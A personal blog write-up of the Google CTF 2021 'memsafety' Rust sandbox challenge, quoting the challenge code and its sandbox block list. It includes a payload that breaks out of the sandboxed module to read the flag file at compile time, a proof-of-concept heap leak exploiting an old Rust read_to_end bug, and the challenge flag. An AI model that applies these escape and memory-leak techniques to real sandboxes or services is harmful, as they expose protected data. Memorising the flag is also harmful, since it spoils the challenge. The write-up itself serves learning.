Lately I've been quite busy with IRL stuff and most of my computer stuff has been dedicated to CTF's - latest of which was Google CTF 2023. It was a great amount of fun and there are posts in the works about it already~

Although it made me reminscent of an older challange that was presented two years ago in Google CTF 2021: ``memsafety``

## Background
Going back 2 years ago is quite wild, I was a bored high school barely surviving *the pandemic*. Back then I was much much less skilled, as it was one of my first ever CTF's. Me and [my friend](https://tzlil.net) competed and managed to complete around 2-3 challanges, honestly more than we anticipated and looking back at it was quite impressive ><

This is the story about the most memorable challange we solved.

## The Challange
After a small analysis it appears this challange contains three of my favorite things of all times: pwn, sandbox escape and Rust~!

Downloading the attachment archive linked on the website we get several files: a ``sources/`` Rust project directory and ``chal.py`` script:

```
├── chal.py
└── sources
    ├── Cargo.lock
    ├── Cargo.toml
    ├── prelude
    │   ├── Cargo.toml
    │   └── src
    │       └── lib.rs
    ├── proc-sandbox
    │   ├── Cargo.toml
    │   └── src
    │       └── lib.rs
    ├── server
    │   ├── Cargo.toml
    │   └── src
    │       └── main.rs
    ├── user-0
    │   ├── Cargo.toml
    │   └── src
    │       └── lib.rs
    └── user-1
        ├── Cargo.toml
        └── src
            └── lib.rs
```

### The sandbox

Scary at first but after a deeper look it isn't bad at all, let's start unpacking the Rust project.\
It seems to be a sandboxing service that pulls programs from ``user-n/src/lib.rs`` and runs them with sandbox constraints defined in ``proc-sandbox/src/lib.rs``.

First we should understand what is the sandboxing mechanism. looking at the code it seems to be walking through the AST of our service and denying unsafe expressions, FFI calls, external crate declerations and denial of access to several critical functions and macros. it is being exported as a procedural macro that will later be used on our service functions. On top of that laters we'll find that our services run in a non-std enviroment - oomf.

```rust
use proc_macro::TokenStream;
use quote::ToTokens;
use syn::visit::Visit;
use syn::{parse_macro_input, ExprUnsafe, ForeignItem, Ident, Item, ItemExternCrate};

struct Sandbox;
const BLOCKLIST: &[&str] = &[
    "env",
    "file",
    "include",
    "include_bytes",
    "include_str",
    "option_env",
    "std",
];

impl<'ast> Visit<'ast> for Sandbox {
    ...
}
```

Seems to be pretty extensive, let's put on our hacker hats and escape the sandbox~
The server module seems to be pulling services to sandbox from ``user-0`` and ``user-1``. the first is a blank program where our code will be probably be stored and the latter reads the flag into the memory.

user-1/src/lib.rs

```rust
#![no_std]
use proc_sandbox::sandbox;

#[sandbox]
pub mod user {
    static FLAG: &'static str = "CTF{s4ndb0x1n9_s0urc3_1s_h4rd_ev3n_1n_rus7}";
    use prelude::{mem::ManuallyDrop, Service, Box, String};
    pub struct State(ManuallyDrop<String>);
    impl State {
        pub fn new() -> Box<dyn Service> {
            Box::new(State(ManuallyDrop::new(String::from(FLAG))))
        }
    }
    impl Service for State {
       fn handle(&mut self, _: &str) {}
    }
}
```

The way the flag is allocated is incredibly weird though, it uses the ``ManuallyDrop`` trait - meaning the flag persists in memory after it gets out of scope (exits the function). This is a huge hint later down the line, perhaps we could leak values off the heap and leak the flag. Anyways, let's continue~

In terms of the Rust program we're almost done. One last look at how the services get executed:
Both services get first allocated and only then ran, meaning they're all simoustanly in scope and present in memory as they run, this only strengthens the theory we had earlier.


server/src/main.rs

```rust
use prelude::Service;
fn main() {
    let mut services: Vec<Box<dyn Service>> = vec![
        user_0::user::State::new(),
        user_1::user::State::new(),
    ];
    for service in &mut services {
        service.handle("test query");
    }
}
```

### Python script
After all of this we're still left with mere ``chal.py``, this seems to be the frontend program that is running for us to access.
It contains quite a lot of complications of it's own so let's take a deeper look~

The main routine can tell us a lot about each individual component of it:

```py
def main():
    user_input = get_user_input()
    write_to_rs(user_input)
    build_challenge()

    # Check user input after building since the compilation in check_user_input() will
    # generate errors after generating the ast since the compilation command is
    # incomplete. Let the proper build run first so users can be presented with any
    # compilation issues, then validate it before we actually run.
    check_user_input()

    run_challenge()
```

It first takes our user input, writes it to our rust project (assumingly in ``user-0/src/lib.rs``), builds it, checks the input and then runs the service if it's valid.

Two important limitations the app presents is that our code gets written inside a sandboxed service (meaning all of the AST sandboxign applies), and there's a check in the ``check_user_input()`` for module escaping:

```py
        if len(ast["module"]["items"]) != 5:
            socket_print("Module escaping detected, aborting.")
            sys.exit(1)
```

## Our Unintented Soltuion
We were a tad overwhelmed at first although there was something that stuck out like a sore thumb to us, the control flow on the python on script. Why include AST checks in it when you have the rust sandboxing module, and why after you first build the program??? 

Scouring through it we found our first vulnerability in the code present in ``write_to_rs()``, it seems to just insert our code into the file without any brackets escpaing checks:

```py
def write_to_rs(contents):
    socket_print("Writing source to disk...")
    rs_prelude = """#![no_std]
    use proc_sandbox::sandbox;

    #[sandbox]
    pub mod user {
        // BEGIN PLAYER REPLACEABLE SECTION
    """.splitlines()

    with open('/home/user/sources/user-0/src/lib.rs', 'w') as fd:
        fd.write('\n'.join(rs_prelude))
        fd.write('\n'.join(contents))
        fd.write("\n}\n")
```

this means we can write code that escapes the sandboxed rust module by satisfying the service traint, closing the mod with a bracket  and creating our own with an unclosed bracket at the end (which will get appended by the script later)

```rust
    // boilerplate code
    use prelude::{Box, Service};
    pub struct State;
    impl State {
        pub fn new() -> Box<dyn Service> {
            Box::new(Self)
        }
    }
    impl Service for State {
       fn handle(&mut self, _: &str) {}
    }
} // close the sandboxed module

// define our own swag module
mod pwn {
    // non sandboxed code

// no curly bracket since it will get added
```

As we jumped out of our chairs in glee we referred to the script and understood why the python AST checks were in place, it catches our sneaky module escape since we add an additional module to the namespace.

This was a good start though; looking at the script again the lisp brainrot struck and we remembered something weird, our code gets built before the user checks - this means macros are executed and expanded at will. Combining these two vulnerabilities seems incredibly promising: we could escape out of the sandboxed module and build a macro that will get expanded without any limitations <3

If you're a Rust newbie and not sure how to write such macro, worry not as the blocklist will provide a list of relevant functions to leverage :D 

Knowing that the flag resides as a static string in the ``user-1`` service, we can ``include_str!`` it and print it to us using compiler debug options. here's our final payload <3

```rust
    // boilerplate code
    use prelude::{Box, Service};
    pub struct State;
    impl State {
        pub fn new() -> Box<dyn Service> {
            Box::new(Self)
        }
    }
    impl Service for State {
       fn handle(&mut self, _: &str) {}
    }
} // close the sandboxed module

// define our own swag module
mod pwn {
    fn leet() {
        compile_error!(include_str!("home/user/sources/user-1/src/lib.rs"));
    }
```

## The Intented Solution - Revisited a Year Later
Our first solution was exciting and worked perfectly for the timespan of the competition - It was obvious the intented solution was leaking the flag from memory,  I felt unsatisfied with it and revisited it quite some time later (What about that ``ManuallyDrop``!!!). This time let's pwn this Rust program, for real.

The vulnerabilities we found last time are not sufficient here since we're anticipating our program to actually get executed in run-time inside the sandbox. I don't have much experience in exploiting Rust programs, but since the code doesn't use any ``unsafe`` blocks it is reasonable to assume the code is ``safe`` in theory. IN PRACTICE THOUGH, I would imagine there's some compiler bug that would allow us to leak memory somewhere, Rust is a young ambitious language that is being improved upon daily <3

Rushing to check the Rust version it seems the application runs ``rustc 1.47.0``, we can plug that into the Rust compiler repository and look for vulnerabilities to leverage. We need to first revisit our application layout a bit, the flag gets loaded into the heap section waiting to be dropped (which doesn't happen till termination) - if we could leak the application's heap we should be able to extract it from there~

Combining our established knowledge and the fact this specific version was chosen we can find [Issue #80895](https://github.com/rust-lang/rust/pull/80895). A bug present in the Rust compiler from version 1.20 to 1.50 that can leak the heap using malicious ``Read`` and ``Drop`` implementations. My understanding of it goes as follows:

We first defined our own "malicious" reader that implements the ``Read`` trait, in the end will read from the heap. it needs a function that takes mutable buffer and will return the length of bytes we read. The malicious Reader will have 2 states: on the first read it will return an arbrtirary number of bytes we would like to read from the heaps, and on the second one it will stop reading. This may appear weird at first but in conjuction with an uninitialized ``Vec`` it is the way to leak our flag :3

Now if we use our reader's ``read_to_end()`` function on the unitnialized vector it will trick the compiler and change the vector's buffer size. It is possible to access the vector after this method by implementing the ``Drop`` trait that will activate whenever it needs to be deallocated (which happens after it is deemed to be read and the malicious modification of it's length), there the access to the heap is ours >:3

Here's a POC for it:

```rust
#![forbid(unsafe_code)]

use std::io::Read;

struct PwnRead {
    first: bool,
}

impl PwnRead {
    pub fn new() -> Self {
        PwnRead { first: false }
    }
}

impl Read for PwnRead {
    fn read(&mut self, _buf: &mut [u8]) -> std::io::Result<usize> {
        if !self.first {
            self.first = true;
            // First state: return more than the buffer size
            Ok(200)
        } else {
            // Second state: we are done >:3
            Ok(0)
        }
    }
}

struct VecHeapWrapper {
    inner: Vec<u8>,
}

impl VecHeapWrapper {
    pub fn new() -> Self {
        VecHeapWrapper { inner: Vec::new() }
    }
}

impl Drop for VecHeapWrapper {
    fn drop(&mut self) {
        // Leak heap !!!!
        // Buffer size has changed to whatever is dictated by the reader
        println!("{:?}", &self.inner);
    }
}

fn main() {
    let mut vec = VecHeapWrapper::new();
    let mut read = PwnRead::new();
    read.read_to_end(&mut vec.inner).unwrap();
}
```

This is by no means an exhaustive look on this bug or any Rust bugs in general, so please read more about it on the GitHub if it is of interest.

## Conclusion
**WOW** what a challenge~

It is maybe not your average C Linux pwn, but it still taught me so much. I endlessly enjoyed the multiple deep ways you can solve it, only deepening my knowledge with each approach. The techniques used in both solutions are not straightforward at all, although they're super fun and not too difficult to catch even under a timeconstraint.

Furthermore, I'm super psyched I chose to return to it and finish it "properly". It taught me so much and only gave validation for the first approach we took.

I really hope you enjoyed reading as much as I enjoyed writing, thank you so much for reaching thus far~ <3